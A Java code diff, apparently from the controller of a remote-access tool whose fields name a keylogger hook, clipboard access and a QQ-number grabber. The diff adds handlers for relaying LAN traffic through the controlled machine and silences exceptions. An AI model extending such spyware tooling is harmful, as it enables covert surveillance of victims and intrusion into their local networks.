@@ -23,6 +23,7 @@ public class ReceiveMessage extends Thread{
     GetQQNumber getQQNumber;
     ClipBorad clipBorad;
     KeyBoardHook hook;
+    LANAccess lanAccess;
     FileOutputStream fileOutputStream;
     RegisterManager registerManager;
     public ReceiveMessage(Socket socket,String IP) throws Exception{
@@ -200,10 +201,29 @@ public class ReceiveMessage extends Thread{
                         case MessageFlags.AUDIO_ERROR:
                             JOptionPane.showMessageDialog(null,"麦克风初始化错误!","错误",JOptionPane.ERROR_MESSAGE);
                             break;
+                        case MessageFlags.FILE_DELETE_ERROR:
+                            JOptionPane.showMessageDialog(null,"文件删除失败","错误",JOptionPane.ERROR_MESSAGE);
+                            break;
+                        case MessageFlags.LAN_ACCESS_OPEN:
+                            lanAccess = new LANAccess(socket,IP);
+                            break;
+                        case MessageFlags.LAN_ACCESS_GET:
+                            len = SendMessage.receiveLength(dataInputStream);
+                            context = SendMessage.receiveContext(dataInputStream, len);
+                            lanAccess.update(context);
+                            break;
+                        case MessageFlags.LAN_ACCESS_ERROR:
+                            JOptionPane.showMessageDialog(null,"访问错误","错误",JOptionPane.ERROR_MESSAGE);
+                            break;
+                        case MessageFlags.LAN_ACCESS_POST:
+                            len = SendMessage.receiveLength(dataInputStream);
+                            context = SendMessage.receiveContext(dataInputStream, len);
+                            lanAccess.update(context);
+                            break;
                 }
             }
         }catch (Exception e) {
-            e.printStackTrace();
+
         }
     }
 }
